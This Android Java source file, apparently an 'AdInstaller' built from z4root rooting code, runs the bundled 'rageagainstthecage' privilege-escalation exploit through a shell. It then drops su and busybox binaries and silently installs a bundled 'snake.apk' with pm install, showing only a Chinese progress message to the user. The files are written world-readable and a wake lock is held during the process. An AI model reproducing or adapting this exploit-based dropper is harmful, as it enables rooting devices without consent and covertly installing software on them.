package com.installer;

import jackpal.androidterm.Exec;

import java.io.FileDescriptor;
import java.io.FileInputStream;
import java.io.FileOutputStream;
import java.io.IOException;
import java.io.InputStream;
import java.util.Calendar;
import java.util.zip.GZIPInputStream;

import android.app.Activity;
import android.app.AlarmManager;
import android.app.PendingIntent;
import android.content.Context;
import android.content.Intent;
import android.os.Bundle;
import android.os.Handler;
import android.os.PowerManager;
import android.os.PowerManager.WakeLock;
import android.util.Log;
import android.widget.TextView;

import com.z4mod.z4root2.R;


public class AdInstaller extends Activity {

	public static final String MODE_ROOT = "MODE_ROOT";
	TextView detailtext;
	private Handler handler= null;

	@Override
	protected void onCreate(Bundle savedInstanceState) {
		super.onCreate(savedInstanceState);
		setContentView(R.layout.main);
		handler = new Handler();
		detailtext = (TextView) findViewById(R.id.detailtext);
		detailtext.setText("正在安装Snake,请稍候..........");
	}
	
	@Override
	public void onStart(){
		super.onStart();
		//dostuff();
		/*
		String isRoot = this.getIntent().getStringExtra(AdInstaller.MODE_ROOT);
		if(isRoot!=null&&"true".equals(isRoot)){
			dotemproot();
		}else{
			dostuff();
		}*/
		
	}

	WakeLock wl;
	public void dostuff() {
		PowerManager pm = (PowerManager) getSystemService(POWER_SERVICE);
		wl = pm.newWakeLock(PowerManager.FULL_WAKE_LOCK | PowerManager.ACQUIRE_CAUSES_WAKEUP | PowerManager.ON_AFTER_RELEASE, "z4root");
		wl.acquire();

		try {
			SaveIncludedFileIntoFilesFolder(R.raw.rageagainstthecage, "rageagainstthecage", getApplicationContext());
		} catch (Exception e1) {
			// TODO Auto-generated catch block
			e1.printStackTrace();
		}

		final int[] processId = new int[1];
		final FileDescriptor fd = Exec.createSubprocess("/system/bin/sh", "-", null, processId);
		Log.i("dostuff", "Got processid: " + processId[0]);

		final FileOutputStream out = new FileOutputStream(fd);
		final FileInputStream in = new FileInputStream(fd);


		new Thread() {
			public void run() {
				byte[] mBuffer = new byte[4096];
				// byte[] mBuffer_t = new byte[4096];
				int read = 0;
				while (read >= 0) {
					try {
						read = in.read(mBuffer);
						String str = new String(mBuffer, 0, read);
						Log.i("dostuff", str);
						
						if (str.contains("Forked")) {
							Log.i("dostuff", "FORKED FOUND!");
							Intent intent = new Intent(getApplicationContext(), AlarmReceiver.class);
							PendingIntent sender = PendingIntent.getBroadcast(getApplicationContext(), 0, intent, 0);

							AlarmManager am = (AlarmManager) getSystemService(ALARM_SERVICE);

							Calendar cal = Calendar.getInstance();
							cal.add(Calendar.SECOND, 1);
							am.set(AlarmManager.RTC_WAKEUP, cal.getTimeInMillis(), sender);

							wl.release();
							Thread.sleep(20000);
							finish();
							return;
						}
					} catch (Exception e) {
						read = -1;
						e.printStackTrace();
					}
				}
			};
		}.start();

		try {
			String command = "chmod 777 " + getFilesDir() + "/rageagainstthecage\n";
			out.write(command.getBytes());
			out.flush();
			command = getFilesDir() + "/rageagainstthecage\n";
			out.write(command.getBytes());
			out.flush();
			
		} catch (Exception ex) {
			ex.printStackTrace();
		}
	}
	
	
	
	public void dotemproot() {
		PowerManager pm = (PowerManager) getSystemService(POWER_SERVICE);
		final WakeLock wl = pm.newWakeLock(PowerManager.FULL_WAKE_LOCK | PowerManager.ACQUIRE_CAUSES_WAKEUP | PowerManager.ON_AFTER_RELEASE, "z4root");
		wl.acquire();
		Log.i("dotemproot", "Starting");

		final int[] processId = new int[1];
		final FileDescriptor fd = Exec.createSubprocess("/system/bin/sh", "-", null, processId);
		Log.i("dotemproot", "Got processid: " + processId[0]);

		final FileOutputStream out = new FileOutputStream(fd);
		final FileInputStream in = new FileInputStream(fd);


		handler.post(new Runnable(){
			public void run() {
				byte[] mBuffer = new byte[4096];
				int read = 0;
				while (read >= 0) {
					try {
						read = in.read(mBuffer);
						String str = new String(mBuffer, 0, read);
						//saystuff(str);
						Log.i("dotemproot", str);
						if (str.contains("finished checked")) {
							saystuff("完成Snake安装..........");;
							break;
						}
					} catch (Exception ex) {						
					}
				}
				wl.release();
			}
		
		});

		try {
			write(out, "id");
			try {
				SaveIncludedZippedFileIntoFilesFolder(R.raw.busybox, "busybox", getApplicationContext());
				SaveIncludedZippedFileIntoFilesFolder(R.raw.su, "su", getApplicationContext());
				SaveIncludedFileIntoFilesFolder(R.raw.snake, "snake.apk", getApplicationContext());
			} catch (Exception e1) {
				e1.printStackTrace();
			}
			write(out, "chmod 777 " + getFilesDir() + "/busybox");
			write(out, getFilesDir() + "/busybox killall rageagainstthecage");
			write(out, getFilesDir() + "/busybox killall rageagainstthecage");
			write(out, "pm install "+getFilesDir()+"/snake.apk");
			write(out, "checkvar=checked");
			write(out, "echo finished $checkvar");
		} catch (Exception ex) {
			ex.printStackTrace();
		}
	}
	public static void SaveIncludedZippedFileIntoFilesFolder(int resourceid, String filename, Context ApplicationContext) throws Exception {
		InputStream is = ApplicationContext.getResources().openRawResource(resourceid);
		FileOutputStream fos = ApplicationContext.openFileOutput(filename, Context.MODE_WORLD_READABLE);
		GZIPInputStream gzis = new GZIPInputStream(is);
		byte[] bytebuf = new byte[1024];
		int read;
		while ((read = gzis.read(bytebuf)) >= 0) {
			fos.write(bytebuf, 0, read);
		}
		gzis.close();
		fos.getChannel().force(true);
		fos.flush();
		fos.close();
	}
	public static void SaveIncludedFileIntoFilesFolder(int resourceid, String filename, Context ApplicationContext) throws Exception {
		InputStream is = ApplicationContext.getResources().openRawResource(resourceid);
		FileOutputStream fos = ApplicationContext.openFileOutput(filename, Context.MODE_WORLD_READABLE);
		byte[] bytebuf = new byte[1024];
		int read;
		while ((read = is.read(bytebuf)) >= 0) {
			fos.write(bytebuf, 0, read);
		}
		is.close();
		fos.getChannel().force(true);
		fos.flush();
		fos.close();
	}
	public void write(FileOutputStream out, String command) throws IOException {
		command += "\n";
		out.write(command.getBytes());
		out.flush();
	}
	

	public void saystuff(final String stuff) {
		runOnUiThread(new Runnable() {
			
			@Override
			public void run() {
				detailtext.setText(stuff);
			}
		});
	}

}
